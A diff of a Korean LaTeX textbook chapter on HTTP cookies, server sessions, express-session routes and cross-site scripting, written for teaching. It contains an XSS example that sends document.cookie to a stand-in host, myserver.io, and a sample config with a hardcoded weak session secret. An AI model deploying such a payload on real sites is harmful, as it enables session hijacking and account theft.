@@ -1,117 +1,134 @@
 \section{HTTP Cookie and Session}\label{sect:http-cookie-and-session}
 
-웹 브라우저에서 웹 사이트를 이용할 때, 브라우저가 웹 사이트에 대한 정보를 기억하는 것을 본 경험이 있을 것입니다. 가장 대표적인 사례가 로그인 정보입니다. 웹 사이트에서 사용자 계정으로 로그인하면, 웹 브라우저는 이를 기억하여 해당 웹 사이트의 다른 페이지에 접속할 때도 사용자의 계정을 기억하고 있습니다. 이번 장에서는 서버와 클라이언트가 이러한 정보를 어떻게 관리하는지에 대해 학습합니다.
+\sectref{sect:hash-functions-and-encryption}에서 비밀번호와 같은 민감한 정보를 적절히 암호화하여 저장하고, 검증하는 방법에 대해 알아보았으며, 이를 이용하여 사용자가 보낸 로그인 요청을 검증한 뒤 그 결과를 사용자에게 응답하는 로그인 기능을 구현할 수 있다. 서버는 특정 사용자에게만 제공되는 정보를 알맞게 제공하기 위해서는 사용자가 보내는 요청이 실제로 로그인에 성공한 사용자가 보낸 요청인지 구분할 수 있어야 한다. 이번 장에서는 서버에서 클라이언트를 어떻게 식별하는지, 클라이언트가 식별을 위한 정보를 어떻게 관리하는지 알아본다.
 
 \subsection*{HTTP Cookie}
 
-HTTP 통신은 클라이언트가 서버에게 요청을 보내면, 그 요청에 대한 응답을 보내는 형식으로 구성되어 있습니다. 이때, 어떤 클라이언트가 어떤 서버에게 두 개의 요청을 보낸다면, 그 서버는 두 요청을 각각 독립적인 요청으로 받아들입니다. 즉, 서버는 동일한 클라이언트로부터 여러 번의 요청을 받아도 같은 클라이언트임을 인지하지 못합니다. (Schema 6.2a) HTTP의 이러한 특징을 무상태(stateless)라고 합니다.
+HTTP 프로토콜은 클라이언트가 서버에 요청을 보내면 서버가 그 요청에 대한 응답을 보내도록 설계된 프로토콜이다. 이때 하나의 클라이언트에서 두 개의 요청을 특정 서버에 보내면, 그 서버는 두 요청을 각각 독립적인 요청으로 인지한다. 즉, 서버는 요청을 보낸 클라이언트를 식별하지 못하며(\figref{fig:auth-without-cookie}), HTTP의 이러한 특징을 무상태(stateless)라고 한다.
 
-그러나 사용자가 웹 사이트에 로그인하여, 서버에 등록된 사용자 계정에 대한 정보를 토대로 웹 사이트를 이용하기 위해서는 서버가 클라이언트를 식별할 수 있어야 합니다. 이를 위해 사용되는 개념이 HTTP 쿠키(cookie)입니다. \sectref{sect:hypertext-transfer-protocol}에서 다루었듯, 클라이언트는 서버에게 HTTP 요청을 보낼 때 HTTP 헤더에 쿠키를 포함시킬 수 있고, 그러므로 사용자가 직접 설정하거나 브라우저가 저장하고 있다가 보낼 수도 있습니다. 반대로 서버는 클라이언트로 하여금 앞으로 서버로 요청을 보낼 때 사용할 쿠키의 값을 HTTP 응답의 헤더에 Set-Cookie를 포함하여 제공합니다. 쿠키는 로그인한 사용자의 정보나 팝업 보지 않기와 같은 임시적인 설정 등을 저장할 때 주로 사용됩니다.
+HTTP에서는 클라이언트를 식별하기 위해 HTTP 쿠키(cookie)를 사용한다. 클라이언트는 서버에 보내는 HTTP 요청 헤더의 Cookie 속성의 값을 설정함으로써 쿠키를 보낼 수 있으며, 이러한 쿠키 값은 서버로부터 받는 HTTP 응답 헤더의 Set-Cookie 속성값을 이용하여 정한다.
 
-Schema 6.2b는 쿠키를 사용하였을 때 사용자를 식별하는 HTTP 통신의 예시입니다. 클라이언트에서 로그인 정보와 함께 서버에 인증을 요청하면, 서버는 클라이언트에게 HTTP 응답을 보내면서 헤더의 Set-Cookie 값을 이용하여 쿠키를 설정합니다. Chrome, Firefox 등의 인터넷 브라우저는 이 Set-Cookie의 값을 저장하고 있다가, 서버에 요청을 보낼 때 쿠키를 헤더에 포함하여 요청합니다. 서버에서는 이 요청을 받아, 쿠키를 이용하여 클라이언트를 식별할 수 있습니다.
+\figref{fig:auth-with-cookie}\는 쿠키를 이용하여 서버가 클라이언트를 식별하는 예시이다. 클라이언트에서 아이디와 비밀번호 등 로그인에 필요한 정보와 함께 로그인 요청을 보내면 서버는 이를 검증한 뒤 응답 헤더의 Set-Cookie 속성의 값을 설정하여 검증 결과를 응답으로 보낸다. Chrome과 Firefox와 같은 웹 브라우저는 HTTP 응답을 분석하여 Set-Cookie 속성의 값을 저장해두었다가, 같은 서버에 보내는 요청 헤더의 Cookie 속성을 저장해둔 값으로 설정하여 요청을 보낸다. 서버에서는 이 요청을 받으면 헤더의 Cookie 값을 이용하여 클라이언트를 식별할 수 있다.
 
-이렇게 쿠키를 이용한 인증은 사용자가 매번 인증 과정을 거치지 않아도 서버가 사용자를 식별할 수 있다는 장점이 있습니다. 그러나 쿠키를 이용한 인증은 몇 가지 단점을 갖습니다. 먼저, 쿠키는 네트워크의 부하를 초래합니다. 쿠키에는 여러 데이터를 저장할 수 있고, 웹 사이트에서 제공하는 서비스가 많아질수록 필요한 쿠키의 양도 많아질 수 있습니다. 그러나 쿠키는 HTTP 요청을 보낼 때마다 헤더에 쿠키를 포함하여 보내야 하는 데이터이므로, 사용하는 쿠키의 크기가 큰 웹 사이트에 HTTP 요청을 많이 보내면, 네트워크에 부하가 초래됩니다.
+이렇게 쿠키를 이용하면 서버가 사용자를 쉽게 식별할 수 있다는 장점이 있으며, 그 외에도 팝업 보지 않기와 같은 임시적인 설정 등을 저장할 때 많이 사용된다. 그러나 쿠키를 이용한 사용자 식별은 몇 가지 단점을 갖는다. 먼저 쿠키에는 여러 데이터가 저장될 수 있고, 웹 사이트에서 제공하는 서비스가 많아질수록 쿠키가 저장하는 데이터가 커질 수 있는데, 매 HTTP 요청에 쿠키값을 명시하여 보내야하기 때문에 네트워크 부하를 초래한다.
 
-두 번째로, 쿠키는 보안에 취약합니다. 쿠키의 특성상, 브라우저에서는 사용자의 쿠키를 사용자의 컴퓨터에 파일로 저장됩니다. 이때 통신에서 사용되는 쿠키에 민감한 개인정보 등 유출되면 안 되는 정보가 포함되어 있을 가능성이 있습니다. 이러한 정보는 브라우저에 의해 파일로 저장되기 때문에, 쿠키와 관련된 로컬 컴퓨터의 파일이 탈취되거나 후술할 XSS 공격으로 쿠키가 탈취되었을 때 쿠키의 내용이 유출될 수 있습니다. 더 나아가, 쿠키는 조작될 수 있는 데이터이기 때문에, 공격자는 자신의 쿠키를 조작하여 다른 사용자인 것처럼 위장한 뒤 서버에 요청을 보내어, 해당 사용자에 대한 권한이 없음에도 불구하고 그 사용자에 대한 데이터를 조작할 수 있습니다.
+두 번째, 쿠키는 보안에 매우 취약하다. 쿠키에는 민감한 개인정보 등이 포함되어있기 마련인데, 브라우저에서는 사용자의 쿠키를 HTTP 요청을 보낼 때 사용하기 위해 파일 형태로 저장해둔다. 이러한 파일이 탈취되거나 후술할 XSS 공격 등으로 인해 쿠키가 탈취된다면 쿠키의 내용이 유출될 수 있다. 또한 공격자는 쿠키를 조작하여 자신의 정보를 조작하거나 다른 사람인 것처럼 위장한 뒤 서버에 요청을 보내면 서버는 그 정보를 식별할 수 없으므로 공격자에게 잘못된 권한을 부여할 수도 있다.
 
 \subsection*{Session}
 
-앞에서 HTTP 쿠키의 작동 방식과 단점에 대해 다루었습니다. 쿠키의 단점을 보완하기 위해 도입된 인증 방식이 세션(session)입니다. 세션은 HTTP 쿠키를 이용하되, 사용자에 대한 데이터는 서버에 저장해두고, 해당 데이터에 부여한 고유 키로 사용자를 식별하는 방법입니다. 즉, 세션을 이용한 인증 방식은 서버 기반 인증 시스템입니다. 이때 데이터에 부여하는 각각의 고유 키를 세션 ID라고 합니다.
+세션(session)은 사용자에 대한 정보는 서버에 저장해두고, 해당 데이터에 부요한 고유 키를 쿠키로 주고받아 사용자를 식별하는 인증 방식으로, 쿠키가 갖는 단점을 일부분 보완할 수 있다.
 
-세션을 이용한 인증 방식은 Schema 6.2c와 같이 작동합니다. 서버에서 사용자에 대한 모든 정보를 클라이언트에 전달하지 않고, 서버 내에 메모리나, 파일, DB 등의 형태로 저장한 뒤, 각 데이터에 대한 세션 ID를 생성합니다. 그리고 HTTP 응답을 보내 클라이언트에게 세션 ID를 쿠키로 사용하도록 전달합니다. 이후 클라이언트가 HTTP 요청을 보낼 때 쿠키로 세션 ID를 전달하면, 서버는 세션 중 전달받은 세션 ID에 대응하는 세션을 찾아, 그 정보를 활용하여 작업을 수행합니다.
+세션을 통한 인증은 \figref{fig:auth-with-session}\과 같이 동작한다. 먼저 로그인 요청이 성공하면 서버는 사용자에 대한 모든 정보를 서버 내에 메모리나 파일, DB 등의 형태로 저장하고, 각 데이터에 대한 고유 키, 즉 세션 ID를 생성한다. 그리고 HTTP 응답 헤더의 Set-Cookie 값에 세션 ID를 명시하여 클라이언트에 전달한다. 이후 클라이언트가 HTTP 요청 헤더의 쿠키로 세션 ID를 명시하여 요청을 보내면 서버는 그 세션 ID에 해당하는 데이터를 찾아 사용자를 식별하게 된다.
 
-이러한 인증 방식은 앞서 제시된 쿠키의 문제 중 네트워크 부하 문제와 보안 문제를 해결하기 때문에, 대부분 웹 애플리케이션에서는 세션을 사용하여 인증 시스템을 구현합니다. 다만, 세션을 이용한 인증이 반드시 쿠키를 이용한 인증보다 우수하다고 볼 수는 없습니다.
-먼저, 세션은 서버 측의 부하를 초래합니다. 세션 인증 방식은 로그인한 사용자에 대한 데이터를 서버 측에서 메모리, 파일, 데이터베이스 등에 저장하기 때문에, 서버 측에 충분한 자원이 확보되어 있어야 합니다. 또한, 저장된 세션 데이터에서 요청받은 세션 ID에 해당하는 데이터를 찾아야 하므로, 이로 인한 오버헤드 역시 발생합니다. 그래서 단시간에 이용자가 폭증하는 서비스에서 쿠키를 사용할 때는 처리 속도가 느려지는 정도에 불과한 문제가 발생한다면, 세션을 사용할 때는 자원이 충분치 못해 프로그램 자체가 kill 되어버리는 문제가 발생할 수 있습니다.
+이렇듯 세션은 쿠키가 갖는 단점인 네트워크 부하 문제와, 탈취되었을 때 민감한 정보가 바로 유출되는 문제를 해결지만, 단점 역시 존재한다. 먼저 세션은 서버 측의 부하를 초래한다. 로그인한 사용자 데이터를 서버 내의 메모리, 파일, DB 등에 저장하기 때문에 저장 용량 등의 자원이 충분히 확보되어 있어야 하며, 세션 ID를 이용하여 세션 데이터를 찾는 과정이 추가되어 이로 인한 속도 저하가 미세하게 마나 발생한다. 따라서 세션을 사용하기 위한 자원이 서버에 충분히 마련되어 있지 않은 경우 서버 프로그램이 kill 되어버리는, 흔히 말하는 ``서버 다운''이 발생할 수 있다. 또한, 세션 역시 보안 문제에서 완전히 자유롭지 못하다. 세션 ID는 어쨌든 HTTP 쿠키를 통해 전달되는 데이터이므로 세션 ID 자체가 탈취당할 수 있으며, 공격자가 탈취한 세션 ID를 이용하여 HTTP 요청을 보내면 서버는 이를 탈취당한 사용자로 인식하게 된다.
 
-또한, 세션 역시 보안 문제에서 완전히 자유롭지 못합니다. 클라이언트에게 전달되는 세션 ID 역시 HTTP 쿠키에 포함되어 전달되는 데이터이기 때문에, 세션 ID 자체가 탈취당할 수 있습니다. 세션 ID는 그 자체가 민감한 정보는 아니지만, 탈취한 세션 ID를 쿠키에 포함하여 HTTP 요청을 보내면 서버는 이를 사용자의 정상적인 요청으로 받아들이고, 사용자의 민감한 정보를 그대로 HTTP 응답에 포함시켜 보낼 수 있습니다.
-따라서 쿠키와 세션은 애플리케이션의 특징과 성격, 쿠키를 통해 공유하고자 하는 정보의 성격 등에 따라 적절히 사용하는 것이 좋으며, 분산 처리 시스템에서 세션을 사용한 인증이나 변경된 데이터의 실시간 반영 등에서의 어려움 등으로 인해 최근에는 JWT(JSON Web Token), OAuth2 등의 토큰 기반 인증 시스템을 사용하는 추세입니다.
+그러나 이러한 단점에도 불구하고 세션은 쿠키에 비해 더 많은 장점을 가지고 있고, 세션의 완벽한 대체재가 없기 때문에 세션을 통한 인증이 주로 사용되며, 웹 애플리케이션의 특징, 성격, 쿠키를 통해 공유하고자 하는 정보 등에 따라 적절히 사용하는 것이 좋다. 최근에는 세션이 갖는 부수적인 문제를 해결하기 위해 JWT(JSON Web Token)나 OAuth2 등의 토큰 기반 인증 시스템을 도입하기도 한다.
+
+\figures{fig:http-auth-communication}{HTTP Authentication Communication}{
+    \subfig{fig:auth-without-cookie}{Without Cookie}
+        {images/authentication/auth-without-cookie.png}{.2968}
+    \subfig{fig:auth-with-cookie}{With Cookie}
+        {images/authentication/auth-with-cookie.png}{.3148}
+    \subfig{fig:auth-with-session}{With Session}
+        {images/authentication/auth-with-session.png}{.3184}
+}
 
 \subsection*{Session Management in Express.js}
 
-사용자에게 인증을 받은 뒤 세션의 생성, 분석, 관리 등의 작업은 구현하기 어려운 로직은 아닙니다. 그러나 준회원 스터디에서는 Express.js에서 제공하는 세션 관리 모듈인 \cd{express-session} 모듈을 이용하여 서버 기반 인증 시스템을 구현해보겠습니다. 먼저, npm을 이용하여 \cd{express}와 \cd{express-session} 모듈을 설치합니다.
+Express.js에서 제공하는 세션 관리 모듈 express-session을 이용하여 세션을 이용한 서버 기반 인증 시스템을 구현한다. express와 express-session 모듈을 설치한 뒤 \coderef{code:express-session-config}\와 같이 코드를 작성한다.
 
 \begin{codeenv}{code:express-session-config}{Session Configuration in Express.js}\begin{verbatim}
 const express = require('express');
 const session = require('express-session');
 
 const app = express();
+const port = 3000;
+
 app.use(session({
     secret: '!@#$%^&*()',
     resave: false,
     saveUninitialized: true,
 }));
 
-app.get('/get', (req, res) => {});
-app.get('/set/:id', (req, res) => {});
-app.get('/destroy', (req, res) => {});
-
-app.listen(3000, () => console.log('Listening'));
+app.listen(port, () => console.log(`Server listening on port ${port}!`));
 \end{verbatim}
 \end{codeenv}
 
-\coderef{code:express-session-config}\는 \cd{express-session} 모듈을 이용하여 세션을 미들웨어 형태로 관리하는 간단한 Express.js 애플리케이션입니다.
+\coderef{code:express-session-config}에서는 express-session 모듈을 이용하여 세션 관리 미들웨어를 생성하고, 이를 \cd{app} 객체에 bind하였다. 이때 \cd{secret} 값은 세션 ID를 암호화하기 위한 key로, 실제 서비스에서는 길고 랜덤하게 생성되어야 하며, 별도로 보관되어야 한다.
 
-\begin{codeenv}{code:express-session-set}{Express.js Session Setting (Derived from \coderef{code:express-session-config})}\begin{verbatim}
+\begin{codeenv}{code:create-session}{Create Session (Derived from \coderef{code:express-session-config})}\begin{verbatim}
 app.get('/set/:id', (req, res) => {
     const { id } = req.params;
-    if (!id) return res.sendStatus(404);
-    req.session.user = {
+    if (!id) return res.sendStatus(400);
+    req.session.requester = {
         id: parseInt(id, 10),
         name: `user#${id}`,
         level: Math.floor(Math.random() * 10) + 1,
     };
-    res.send(`Completed /set/${id}`);
+    return res.send(`Completed /set/${id}`);
 });
 \end{verbatim}
 \end{codeenv}
 
-\coderef{code:express-session-set}\은 \coderef{code:express-session-config}\를 수정하여, GET /set/:id 형태의 라우트로 요청을 받았을 때 \cd{id} 값에 따라 세션을 생성하고, 클라이언트에 응답을 보내는 코드입니다. 코드에서 볼 수 있듯, 세션은 요청 객체의 \cd{session} 객체를 수정하여 생성할 수 있고, 세션이 생성되면 세션 미들웨어에서는 세션 ID를 생성하여 세션의 내용을 메모리에 저장한 뒤 세션 ID를 HTTP 응답에 포함하여 클라이언트에게 보냅니다.
+\coderef{code:create-session}\은 \coderef{code:express-session-config}에 \cd{params.id} 값에 따라 세션을 생성하고, 클라이언트에 응답을 보내는 GET /set/:id 라우트를 구현한 코드이다. 세션은 요청 객체의 \cd{session} 객체에 값을 할당함으로써 생성할 수 있으며, 이때 세션 ID가 같이 생성되면서 세션 데이터와 함께 메모리에 저장된다. 이후 세션 미들웨어는 HTTP 응답 헤더의 Set-Cookie 값이 생성된 세션 ID으로 설정하여 클라이언트에 보낸다.
 
-\begin{codeenv}{code:express-session-get}{Getting Session in Express.js (Derived from \coderef{code:express-session-config})}\begin{verbatim}
+\begin{codeenv}{code:access-session}{Access Session (Derived from \coderef{code:express-session-config})}\begin{verbatim}
 app.get('/get', (req, res) => {
-    const { user } = req.session;
-    if (!user) return res.sendStatus(404);
-    res.send(`id: ${user.id} / name: ${user.name} / level: ${user.level}`);
+    const { requester } = req.session;
+    if (!requester) return res.sendStatus(401);
+    const { id, name, level } = requester;
+    return res.send(`id: ${id} / name: ${name} / level: ${level}`);
 });
 \end{verbatim}
 \end{codeenv}
 
-\coderef{code:express-session-get}\은 \coderef{code:express-session-config}\를 수정하여, GET /get 라우트로 요청을 받았을 때, 클라이언트의 세션 값을 이용하여 응답을 보내는 코드입니다. 세션 미들웨어는 HTTP 요청의 쿠키 값을 분석하여, 요청받은 세션 ID에 해당하는 데이터를 \cd{req.session} 객체에 넣습니다. \coderef{code:express-session-set}에서 \cd{req.session.user} 객체에 데이터를 저장하였으므로, 저장된 세션 데이터를 가져올 때에도 \cd{req.session.user} 객체의 값을 읽습니다.
+\coderef{code:access-session}\은 \coderef{code:express-session-config}에 세션 ID에 따른 세션 데이터를 텍스트 형태로 응답하는 GET /get 라우트를 구현한 코드이다. 세션 미들웨어는 HTTP 요청의 쿠키에서 세션 ID를 찾고, 이를 이용하여 세션 데이터를 요청 객체의 \cd{session} 객체에 할당한다. 세션 데이터는 \coderef{code:create-session}에서 세션을 생성할 때 사용한 속성명과 같은 이름의 객체, 즉 \cd{requester} 객체를 통해 접근할 수 있다.
 
-\begin{codeenv}{code:code:express-session-destroy}{Destroying Session in Express.js (Derived from \coderef{code:express-session-config})}\begin{verbatim}
+\begin{codeenv}{code:destroy-session}{Destroy Session (Derived from \coderef{code:express-session-config})}\begin{verbatim}
 app.get('/destroy', (req, res) => {
     req.session.destroy(err => {
-        if (err) res.sendStatus(500);
-        else res.send('Destroy Completed');
+        if (err) return res.sendStatus(500);
+        else return res.send('Destroy Completed');
     });
 });
 \end{verbatim}
 \end{codeenv}
 
-\coderef{code:code:express-session-destroy}\는 \coderef{code:express-session-config}\를 수정하여, GET /destroy 라우트로 요청을 받았을 때, 해당 클라이언트의 세션을 삭제하는 코드입니다. 이렇게 세션을 삭제하여 로그아웃과 같은 작업을 수행할 수 있습니다.
+\coderef{code:destroy-session}\은 \coderef{code:express-session-config}에 요청한 클라이언트에 해당하는 세션을 삭제하는 GET /destroy 라우트를 구현한 코드이다. 로그아웃 기능은 세션을 삭제하여 수행된다.
 
-이제 위에서 작성한 코드를 실행한 후, Chrome이나 Firefox 등의 브라우저에서 애플리케이션이 어떻게 동작하는지 확인해봅니다. 또한, 이러한 브라우저에서는 개발자 도구에서 쿠키를 확인할 수 있는데, Chrome은 개발자 도구의 Application 탭, Firefox는 Storage 탭을 이용하여 \figref{fig:chrome-devtools-view-cookie}\와 같이 클라이언트가 저장하고 있는 쿠키의 값을 확인할 수 있습니다.
-
-\figures{fig:chrome-devtools-view-cookie}{Viewing Cookies in Chrome DevTools}{
-    \fig{images/authentication/chrome-devtools-view-cookie.png}{.7}
+\figures{fig:insomnia-cookie}{Cookie Management on Insomnia}{
+    \subfig{fig:insomnia-cookie-set}{Set-Cookie on Response Header}
+        {images/authentication/insomnia-cookie-set.png}{.475}
+    \subfig{fig:insomnia-cookie-send}{Cookie on Request Header}
+        {images/authentication/insomnia-cookie-send.png}{.475}
 }
+
+서버를 실행하고 Insomnia를 이용하여 쿠키를 받고 보내본다. GET /set/:id 라우트로 요청을 보내면 서버는 응답 헤더의 Set-Cookie 속성에 쿠키값을 설정하여 응답하며, GET /get 요청을 보낼 때 Header 탭에서 Cookie의 값을 응답을 통해 받은 쿠키값으로 설정하여 보내면 세션에 저장된 데이터를 응답받을 수 있다.
+
+\figures{fig:view-cookie}{View Cookie on Browsers}{
+    \subfig{fig:view-cookie-chrome}{Chrome}
+        {images/authentication/view-cookie-chrome.png}{.475}
+    \subfig{fig:view-cookie-firefox}{Firefox}
+        {images/authentication/view-cookie-firefox.png}{.475}
+}
+
+Chrome이나 Firefox 등의 브라우저에서도 웹 서버의 동작을 확인해본다. 또한, 각 브라우저의 개발자 도구에서는 쿠키값을 확인할 수 있는데, \figref{fig:view-cookie}\와 같이 개발자 도구의 Application 탭이나 Storage 탭을 이용하여 브라우저(클라이언트)가 저장하는 쿠키의 값을 확인해본다.
 
 \subsection*{Cross-Site Scripting (XSS)}
 
-앞서 쿠키와 세션을 다루면서, 쿠키와 세션의 단점은 ``보안''이라고 하였습니다. 세션은 쿠키의 취약한 보안을 어느 정도 보완하였으나, 세션 역시 쿠키를 사용한 시스템이기 때문에 보안으로부터 완전히 자유롭지 못합니다. 공격자가 A라는 사용자가 저장하고 있는 쿠키에 포함된 세션 ID를 탈취하여, 이를 이용해 HTTP 요청을 보내면 서버는 공격자를 A 사용자로 인식합니다.
+앞에서 언급한 바와 같이 쿠키를 이용한 인증 방식은 구조적으로 보안 문제를 가지고 있으며, 세션 방식 역시 이 문제에서 완전히 자유롭지 못하다. 예를 들어 공격자가 A라는 사용자가 서버와의 통신을 위해 저장한 쿠키에 포함된 세션 ID를 탈취하고 이를 이용하여 HTTP 요청을 보내면 서버는 공격자를 사용자 A로 인식한다.
 
-쿠키를 탈취하는 여러 방법 중 가장 기초적인 방법은 Cross-Site Scripting(XSS)입니다. XSS는, 브라우저가 특정 웹 사이트에서 HTTP 요청이 발생하였을 때, HTTP 요청의 헤더에 그 사이트에서 사용하는 쿠키의 값을 포함시켜 보낸다는 점을 이용한 공격입니다. 공격자는 게시글 등록 등의 기능을 이용하여, 클라이언트에서 실행되었을 때 공격자의 서버로 HTTP 요청을 보내는 악성 스크립트를 게시글 등의 형태로 심어둡니다. 이후 사용자가 클라이언트에서 게시글 열람 등으로 악성 스크립트를 HTTP 응답의 형태로 받으면, 악성 스크립트가 실행되면서 공격자의 서버로 HTTP 요청을 보내고, 이 HTTP 요청에 사용자의 쿠키가 포함되어 있으므로 쿠키가 탈취됩니다.
+쿠키를 탈취하는 여러 방법 중 가장 기초적인 방법은 Cross-Site Scripting(XSS)이다. 공격자는 다른 사용자의 쿠키값을 공격자의 서버로 전송하는 악성 스크립트를 HTML 문서에 삽입하여 해당 문서를 열람한 사용자의 쿠키를 탈취한다. 이러한 공격은 대체로 게시글 등록 기능, 특히 HTML 작성 기능을 통해 주로 발생하며 악성 스크립트를 포함한 게시글을 열람한 사용자는 공격자에게 쿠키를 탈취당하게 된다.
 
 \begin{codeenv}{code:xss-example}{Simple Example of XSS}\begin{verbatim}
-<p>Following image is my artworks</p>
-<img src="http://www.imagestorage.com/image?id=8FA19B" alt="My Work">
+<p>Welcome!</p>
+<img src="#"
+     onerror="location.href=$`http://myserver.io/get_cookie?cookie=${document.cookie}`">
 \end{verbatim}
 \end{codeenv}
 
-XSS는 주로 게시판 형태의 서비스에서 발생하기 쉽습니다. 많은 게시판 서비스가 글을 작성할 때 HTML 코드를 넣어 작성하는 기능을 지원합니다. 예를 들어, 공격자가 \coderef{code:xss-example}\과 같은 내용의 게시글을 작성하였다고 가정하면, 서버는 이 글의 내용을 DB에 저장하고 있다가, 다른 사용자가 작성된 게시글을 보기 위해 HTTP 요청을 보내면 \coderef{code:xss-example}\을 포함한 HTML 문서를 작성한 후, 클라이언트에게 응답으로 보냅니다.
+\coderef{code:xss-example}\은 XSS 공격의 간단한 예시로, 공격자가 이러한 내용의 글을 등록하면 서버의 DB에 저장한다. 이후 다른 사용자가 이 게시물을 열람하기 위해 요청을 보내면 이 코드가 포함된 HTML 문서를 응답으로 받게되며, \cd{img} 태그의 \cd{src}에 해당하는 링크가 존재하지 않으므로 \cd{onerror} 속성의 JS 코드가 실행된다. \cd{document.cookie} 객체에는 그 HTML 문서를 요청하는데 사용된 쿠키가 저장되어 있으므로 myserver.io라는 서버에 쿠키값을 그대로 전송하게 된다.
 
-클라이언트에서는 이 HTML 문서를 렌더링하면서, \cd{img} 태그 요소에 해당하는 이미지를 가져오기 위해 \cd{src} 속성값인 서버로 HTTP 요청을 보냅니다. 이때 게시글을 열람한 사용자의 쿠키가 HTTP 요청에 포함되어 해당 서버로 보내지고, 해당 서버가 공격자가 쿠키 탈취를 위해 생성한 서버라면 사용자의 쿠키가 고스란히 공격자의 손에 넘어가게 됩니다. 이렇게 이용 중인 웹 사이트가 아닌 다른 사이트로 요청을 보냄으로써 XSS 공격이 이루어질 수 있습니다.
+이렇게 XSS는 공격자 입장에서는 공격하기 쉽고, 개발자 입장에서는 방어하기 힘들며, 일반 사용자 입장에서는 당하기 쉽고 당했는지도 알기 힘든 공격 방식이다. 이로 인해 사용자가 다른 웹 사이트에 접속하려고 할 때 신뢰할 수 있는 사이트에만 접속하라는 메시지를 띄우는 웹 사이트도 있다.
 
-XSS는 공격자 입장에서는 공격하기 쉽고, 개발자 입장에서는 방어하기 힘들며, 일반 사용자 입장에서는 당하기 쉽고 당하였는지도 알기 힘든 공격 방식입니다. 이로 인해 사용자가 다른 웹 사이트에 접속할 때 신뢰할 수 있는 사이트에만 접속하라는 메시지를 띄우는 웹 사이트도 있습니다.
-
-웹 애플리케이션 개발자는 XSS 공격에 대비하여야 합니다. 사용자에게서 들어오는 입력 중 게시글과 같이 DB에 그대로 저장된 후 다시 사용자에게 보여질 수 있는 입력값을 검증하여, XSS가 발생할 수 있는 부분을 제거해야 합니다. 이러한 작업을 sanitize(소독)라고 하며, 다행히도 sanitize 작업을 수행해주는 모듈이 많이 개발되어 있고, 입력값에 대해 sanitize 작업을 수행하여 DB에 저장하여 XSS 공격을 예방할 수 있습니다.
+웹 서버 개발자는 XSS 공격을 반드시 방어하여야 한다. 사용자로부터 들어오는 입력값 중 게시글과 같이 DB에 저장된 후 다른 사용자에게 보여지는 입력값을 검증하여, XSS가 발생할 수 있는 부분을 제거해야 하며, 이러한 작업을 sanitize(소독)라고 한다. 다행히도 이러한 sanitize 작업을 수행해주는 모듈이 많이 개발되어 있어 개발자는 이러한 모듈을 적극 활용하여 XSS 공격을 예방할 수 있다. 또한, 궁극적인 방어 방법은 아니지만 쿠키를 \cd{HttpOnly}로 설정하여 \cd{document.cookie}를 통해 쿠키값에 접근할 수 없게 할 수도 있다. 앞의 \coderef{code:express-session-config}\는 \cd{HttpOnly} 쿠키를 추가하였으며, \figref{fig:insomnia-cookie-set}\과 \figref{fig:view-cookie}\를 통해 확인할 수 있다.
